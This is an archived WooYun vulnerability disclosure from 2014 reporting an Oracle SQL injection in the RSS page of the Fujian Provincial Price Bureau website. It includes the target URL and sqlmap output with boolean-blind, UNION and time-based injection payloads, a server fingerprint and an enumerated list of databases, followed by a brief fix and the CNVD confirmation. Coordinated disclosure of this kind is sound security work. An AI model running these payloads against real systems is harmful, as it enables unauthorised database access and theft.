wybug_title: 福建省物价局Oracle 注射
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail: 漏洞详情 披露状态：   									2014-06-08：	细节已通知厂商并且等待厂商处理中									2014-06-12：	厂商已经确认，细节仅向厂商公开									2014-06-22：	细节向核心白帽子及相关领域专家公开									2014-07-02：	细节向普通白帽子公开									2014-07-12：	细节向实习白帽子公开									2014-07-23：	细节向公众公开  简要描述： 福建省物价局Oracle 注射。 详细说明：  http://www.fjjg.gov.cn/cms/cms/infopub/rss.jsp?channelcode=A1228&maxnum=20   漏洞证明：  Place: GETParameter: channelcode    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: channelcode=A1228' AND 3847=3847 AND 'ZeDl'='ZeDl&maxnum=20    Type: UNION query    Title: Generic UNION query (NULL) - 4 columns    Payload: channelcode=-3571' UNION ALL SELECT NULL,NULL,CHR(113)||CHR(109)||CHR(100)||CHR(121)||CHR(113)||CHR(101)||CHR(111)||CHR(117)||CHR(74)||CHR(69)||CHR(76)||CHR(109)||CHR(120)||CHR(101)||CHR(106)||CHR(113)||CHR(97)||CHR(101)||CHR(110)||CHR(113),NULL FROM DUAL-- &maxnum=20    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: channelcode=A1228' AND 9062=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'txua'='txua&maxnum=20---web server operating system: Windowsweb application technology: JSP, Apache 2.0.65back-end DBMS: Oraclesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: channelcode    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: channelcode=A1228' AND 3847=3847 AND 'ZeDl'='ZeDl&maxnum=20    Type: UNION query    Title: Generic UNION query (NULL) - 4 columns    Payload: channelcode=-3571' UNION ALL SELECT NULL,NULL,CHR(113)||CHR(109)||CHR(100)||CHR(121)||CHR(113)||CHR(101)||CHR(111)||CHR(117)||CHR(74)||CHR(69)||CHR(76)||CHR(109)||CHR(120)||CHR(101)||CHR(106)||CHR(113)||CHR(97)||CHR(101)||CHR(110)||CHR(113),NULL FROM DUAL-- &maxnum=20    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: channelcode=A1228' AND 9062=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'txua'='txua&maxnum=20---web server operating system: Windowsweb application technology: JSP, Apache 2.0.65back-end DBMS: Oracleavailable databases [9]:[*] APEX_030200[*] CMS[*] CTXSYS[*] EXFSYS[*] MDSYS[*] OLAPSYS[*] SYS[*] SYSTEM[*] XDB   修复方案：  参数过滤   版权声明：转载请注明来源 Hotler0o@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-06-12 16:19 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给福建分中心处置。 最新状态： 暂无
